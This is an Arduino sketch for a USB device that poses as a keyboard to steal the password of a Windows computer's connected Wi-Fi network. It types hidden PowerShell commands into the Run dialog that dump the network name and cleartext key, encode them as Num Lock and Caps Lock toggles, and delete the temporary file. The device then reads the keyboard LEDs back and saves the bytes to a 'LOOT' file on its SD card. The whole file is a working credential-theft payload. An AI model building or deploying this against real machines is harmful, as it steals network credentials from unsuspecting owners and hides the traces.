/**
 * Steal the credentials of the currently connected wifi network.
 * 
 * This example uses Key reflection to exfiltrate data from the host pc
 * 
 * For Arduino Micro, SD card attached to SPI bus as follows:
 * MOSI - D16
 * MISO - D14
 *CLK - D15
 * CS - D10 (Can be changed with SD_CS)
 * 
 */

#include "HID-Project.h"
#include <SPI.h>
#include <SD.h>

#define SD_CS 10 // SD card chip select
#define COMMAND_DELAY 400 // You may need to increase this delay if your target is slow
#define FILE_PREFIX "LOOT"   // must be uppercase
#define FILE_EXTENSION "TXT" // must be uppercase
#define FILE_DIGITS_STR "3"  // number padding size. Can be 1-9 and must be a string
#define FILE_DIGITS ((int)(FILE_DIGITS_STR[0] - '0')) // The actual number of digits
#define FILE_NAME_SIZE (strlen(FILE_PREFIX) + FILE_DIGITS + 1 + strlen(FILE_EXTENSION))
#define FILE_FMT_STR FILE_PREFIX "%0" FILE_DIGITS_STR "d." FILE_EXTENSION

#define BIT_CHANGED(a, b, mask) (((a) ^ (b)) & (mask)) // check if a bit indicated by mask changed from b to a



/**
 * @brief Get a Loot File object
 * This function scans the root directory for the 
 * latest loot file and creates a new one with
 * the consecuting number.
 * 
 * @return The new loot File 
 */
File getLootFile()
{
  File root = SD.open("/");
  File entry;
  int i = -1;
  char *fname;

  // Get the biggest index
  while (entry = root.openNextFile())
  {
    fname = entry.name();
    if (strncmp(FILE_PREFIX, fname, strlen(FILE_PREFIX)) == 0 // file is loot file
        && strlen(fname) == FILE_NAME_SIZE) // fname correct length
    { 
      fname[strlen(FILE_PREFIX) + FILE_DIGITS] = '\0'; // get the index string
      int curr_i = atoi(fname + strlen(FILE_PREFIX)); // convert the index string to int
      i = max(curr_i, i); // keep the bigger value
    }
    entry.close();
  }

  // format file name
  sprintf(fname, FILE_FMT_STR, i + 1);
  
  return SD.open(fname, FILE_WRITE); // Open the file and return it
}

/**
 * @brief Exfiltrates data from host using keyboard LEDs
 * When the NumLock led changes state, 1 is recorded
 * When the CapsLock led changes state, 0 is recorded
 * When the ScrollLock led changes state the exfiltration is complete
 * @param out_file the file to write to
 */
void exfiltrate(File out_file)
{
  uint8_t c_i = 0;
  uint8_t c = 0;
  uint8_t leds = BootKeyboard.getLeds();
  uint8_t last_leds = leds;

  while (!BIT_CHANGED(last_leds, leds = BootKeyboard.getLeds(), LED_SCROLL_LOCK)) // run until Scroll lock led changes
  {
    if (BIT_CHANGED(last_leds, leds, LED_NUM_LOCK)) // Num lock led changed
    {
      c <<= 1;
      c |= 1; // add 1 to c
      c_i++;
    }
    else if (BIT_CHANGED(last_leds, leds, LED_CAPS_LOCK)) // Caps lock led changed
    {
      c <<= 1;
      c |= 0;
      c_i++;
    }

    if (c_i == 8) // finished a byte
    {
      //Serial.println(c,BIN);
      out_file.write(c);
      c_i = 0; // add 0 to c
      c = 0;
    }

    last_leds = leds;
  }
}

/**
 * @brief Opens the run prompt
 */
void windows_r()
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(200);
}

void setup()
{
  //Serial.begin(9600);
  // Wait until sd card is mounted
  while (!SD.begin(SD_CS))
  {
    delay(1000);
  }

  // Create loot file
  File loot_file = getLootFile();

  // Start keyboard
  BootKeyboard.begin();

  // Delay to allow the keyboard to connect
  delay(2000);

  // ---- Start of Payload ----

  // Store the currently connected WiFi SSID & Password to %tmp%\z
  windows_r();
  BootKeyboard.println("powershell -WindowStyle hidden \"netsh wlan show profile name=(Get-NetConnectionProfile)[0].Name key=clear|?{$_-match'SSID n|Key C'}|%{($_ -split':')[1]} | Out-File -encoding ascii $env:tmp\\z\"");
  delay(COMMAND_DELAY);

  // Convert the %tmp%\z into CAPSLOCK and NUMLOCK values.
  windows_r();
  BootKeyboard.println("powershell -WindowStyle hidden \"foreach($b in $(cat $env:tmp\\z -En by)){foreach($a in 0x80,0x40,0x20,0x10,0x08,0x04,0x02,0x01){if($b-band$a){$o+='%{NUMLOCK}'}else{$o+='%{CAPSLOCK}'}}}; $o+='%{SCROLLLOCK}';echo $o >$env:tmp\\z\"");
  delay(COMMAND_DELAY);

  // Send the CAPSLOCK and NUMLOCK Keystrokes to change the LEDs.
  windows_r();
  BootKeyboard.println("powershell -WindowStyle hidden \"$o=(cat $env:tmp\\z);Add-Type -A System.Windows.Forms;[System.Windows.Forms.SendKeys]::SendWait($o);rm $env:tmp\\z\"");
  
  // Exfiltrate the data
  exfiltrate(loot_file);

  // Close the loot file
  loot_file.close();

  // ---- End of Payload ----
}

void loop()
{
  // nothing to do here
}
